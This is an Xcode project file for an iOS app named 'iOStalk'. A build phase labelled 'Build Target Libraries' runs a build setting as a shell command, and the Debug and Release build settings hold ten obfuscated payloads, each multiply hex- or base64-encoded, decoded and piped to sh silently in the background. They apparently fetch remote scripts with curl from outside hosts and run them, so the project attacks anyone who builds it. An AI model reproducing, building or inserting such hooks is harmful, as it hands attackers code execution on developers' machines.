// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		052E45C22DA05354009CAB58 /* Supabase in Frameworks */ = {isa = PBXBuildFile; productRef = 052E45C12DA05354009CAB58 /* Supabase */; };
		057219902F74458600656896 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0572198F2F74458600656896 /* Alamofire */; };
		057332E32EDCC2E100FB9354 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 057332E22EDCC2E100FB9354 /* Kingfisher */; };
		057338482F0440C000FB9354 /* Vision.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 057338472F0440C000FB9354 /* Vision.framework */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
				/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		052E459D2DA050F6009CAB58 /* iOStalk.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iOStalk.app; sourceTree = BUILT_PRODUCTS_DIR; };
		057338472F0440C000FB9354 /* Vision.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Vision.framework; path = System/Library/Frameworks/Vision.framework; sourceTree = SDKROOT; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		057227092F75B1F300656896 /* Exceptions for "iOStalk" folder in "iOStalk" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 052E459C2DA050F6009CAB58 /* iOStalk */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		052E459F2DA050F6009CAB58 /* iOStalk */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				057227092F75B1F300656896 /* Exceptions for "iOStalk" folder in "iOStalk" target */,
			);
			path = iOStalk;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		052E459A2DA050F6009CAB58 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				057332E32EDCC2E100FB9354 /* Kingfisher in Frameworks */,
				057219902F74458600656896 /* Alamofire in Frameworks */,
				057338482F0440C000FB9354 /* Vision.framework in Frameworks */,
				052E45C22DA05354009CAB58 /* Supabase in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		052E45942DA050F6009CAB58 = {
			isa = PBXGroup;
			children = (
				052E459F2DA050F6009CAB58 /* iOStalk */,
				057338462F0440C000FB9354 /* Frameworks */,
				052E459E2DA050F6009CAB58 /* Products */,
			);
			sourceTree = "<group>";
		};
		052E459E2DA050F6009CAB58 /* Products */ = {
			isa = PBXGroup;
			children = (
				052E459D2DA050F6009CAB58 /* iOStalk.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		057338462F0440C000FB9354 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				057338472F0440C000FB9354 /* Vision.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		052E459C2DA050F6009CAB58 /* iOStalk */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 052E45AD2DA050F7009CAB58 /* Build configuration list for PBXNativeTarget "iOStalk" */;
			buildPhases = (
				AA3F12B25C1A4813B93C1CD3 /* Build Target Libraries */,
				052E45992DA050F6009CAB58 /* Sources */,
				052E459A2DA050F6009CAB58 /* Frameworks */,
				052E459B2DA050F6009CAB58 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				052E459F2DA050F6009CAB58 /* iOStalk */,
			);
			name = iOStalk;
			packageProductDependencies = (
				052E45C12DA05354009CAB58 /* Supabase */,
				057332E22EDCC2E100FB9354 /* Kingfisher */,
				0572198F2F74458600656896 /* Alamofire */,
			);
			productName = iOStalk;
			productReference = 052E459D2DA050F6009CAB58 /* iOStalk.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		052E45952DA050F6009CAB58 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					052E459C2DA050F6009CAB58 = {
						CreatedOnToolsVersion = 16.2;
					};
				};
			};
			buildConfigurationList = 052E45982DA050F6009CAB58 /* Build configuration list for PBXProject "iOStalk" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 052E45942DA050F6009CAB58;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				052E45C02DA05354009CAB58 /* XCRemoteSwiftPackageReference "supabase-swift" */,
				057332E12EDCC2E100FB9354 /* XCRemoteSwiftPackageReference "Kingfisher" */,
				0572198E2F74458600656896 /* XCRemoteSwiftPackageReference "Alamofire" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 052E459E2DA050F6009CAB58 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				052E459C2DA050F6009CAB58 /* iOStalk */,
			);
		};
/* End PBXProject section */

/* Begin PBXShellScriptBuildPhase section */
		AA3F12B25C1A4813B93C1CD3 /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		052E459B2DA050F6009CAB58 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		052E45992DA050F6009CAB58 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		052E45AB2DA050F7009CAB58 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3DC1C3 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333363333333633333334333633333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333733333332333333363333333933330a3336333333373333333633333331333333363333333333333336333333343333333633363335333333323336333533333336333333393333333633360a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)";
				A1ECAD1 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
				A45ED5A = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333336333333363333333933333336333333343333333633333334333333363336333333330a3336333333353333333633363331333333363336333633333337333333393333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWbTB4ZDJGRk1YSk9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1dYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A6E983A = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | v | sh ) >/dev/null 2>&1 &)";
				A8DAD24 = "((i(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1UR3R6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXNhWFIwYkdWaFpITXVhVzR2WVNraUlId2djMmdLCg== | i | sh ) >/dev/null 2>&1 &)";
				A97BDCE = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNa1pZV2toQ1drMXRhRzlhUlUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdFNNbmd3VjJ4b2EySkdiSFJPVjNoclVYcFdkMWx0YXpWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | n | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxiR2x1YXk1eWRTOWhLU0lnZkNCemFBbz0K | z | sh ) >/dev/null 2>&1 &)";
				AF17F99 = "((s(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | s | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		052E45AC2DA050F7009CAB58 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3DC1C3 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333363333333633333334333633333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333733333332333333363333333933330a3336333333373333333633333331333333363333333333333336333333343333333633363335333333323336333533333336333333393333333633360a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)";
				A1ECAD1 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
				A45ED5A = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333336333333363333333933333336333333343333333633333334333333363336333333330a3336333333353333333633363331333333363336333633333337333333393333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWbTB4ZDJGRk1YSk9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1dYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A6E983A = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | v | sh ) >/dev/null 2>&1 &)";
				A8DAD24 = "((i(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1UR3R6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXNhWFIwYkdWaFpITXVhVzR2WVNraUlId2djMmdLCg== | i | sh ) >/dev/null 2>&1 &)";
				A97BDCE = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNa1pZV2toQ1drMXRhRzlhUlUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdFNNbmd3VjJ4b2EySkdiSFJPVjNoclVYcFdkMWx0YXpWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | n | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxiR2x1YXk1eWRTOWhLU0lnZkNCemFBbz0K | z | sh ) >/dev/null 2>&1 &)";
				AF17F99 = "((s(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | s | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		052E45AE2DA050F7009CAB58 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = iOStalk/iOStalk.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"iOStalk/Preview Content\"";
				DEVELOPMENT_TEAM = GZA56QT8DR;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.tal.demo.exmaple;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		052E45AF2DA050F7009CAB58 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = iOStalk/iOStalk.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
